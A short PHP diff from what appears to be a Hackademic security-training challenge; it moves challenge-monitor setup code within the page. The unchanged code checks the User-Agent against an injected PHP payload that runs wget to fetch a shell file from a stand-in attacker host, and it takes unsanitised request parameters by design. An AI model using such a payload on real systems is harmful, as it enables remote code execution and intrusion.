@@ -45,7 +45,11 @@ One of their most important attacks was when they tampered with the data stored 
 error_reporting(0);
 $shiz = $_REQUEST['source'];
 $page = $_REQUEST['page'];
-
+			include_once dirname(__FILE__).'/../../init.php';		
+			session_start();
+			require_once(HACKADEMIC_PATH."pages/challenge_monitor.php");
+			$monitor->update(CHALLENGE_INIT,$_GET['user'],$_GET['id'],$_GET['token']);
+ 
 if((!isset($shiz)) && (!isset($page))){
      echo '
 	 <html>
@@ -67,11 +71,7 @@ if((!isset($shiz)) && (!isset($page))){
 }else{
 	if ($page == "answer.php"){
 		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
-			include_once dirname(__FILE__).'/../../init.php';		
-			session_start();
-			require_once(HACKADEMIC_PATH."pages/challenge_monitor.php");
-			$monitor->update(CHALLENGE_INIT,$_GET['user'],$_GET['id'],$_GET['token']);
- 
+			
 			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
 			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
 			{
